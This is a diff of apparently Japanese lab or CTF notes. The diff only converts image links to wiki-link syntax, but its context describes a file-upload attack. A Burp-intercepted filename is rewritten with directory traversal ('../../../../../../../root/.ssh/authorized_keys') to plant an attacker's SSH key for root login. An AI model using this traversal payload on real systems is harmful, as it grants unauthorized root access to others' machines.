@@ -24,13 +24,13 @@ kali@kali:~$ cat fileup.pub > authorized_keys
 2. fileのアップロード
 - Burpを起動し、Interceptをon
 - 作成したauthorized_keysをupload
-![](Pasted%20image%2020260429180346.png)
+![[Pasted image 20260429180346.png]]
 - Interceptした通信をディレクトリトラバーサルを利用し、送信
 ```bash
 # filenameの箇所をディレクトリトラバーサルの形で改ざん
 filename="../../../../../../../root/.ssh/authorized_keys"
 ```
-![](Pasted%20image%2020260429180338.png)
+![[Pasted image 20260429180338.png]]
 
 3. アップロードしたファイルを使用してログイン
 ```
